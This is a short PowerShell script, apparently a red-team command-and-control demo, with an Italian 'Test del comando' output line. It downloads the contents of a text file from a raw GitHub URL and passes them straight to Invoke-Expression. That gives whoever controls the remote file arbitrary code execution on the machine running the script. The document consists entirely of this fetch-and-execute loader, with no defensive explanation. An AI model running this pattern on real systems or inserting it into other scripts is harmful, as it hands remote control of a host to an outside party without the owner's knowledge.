
$cmd = Invoke-webrequest -URI "https://raw.githubusercontent.com/roccosicilia/sToolz/master/RedTeam/C2demo/input.txt"
Write-Host "Test del comando" + $cmd

Invoke-Expression $cmd
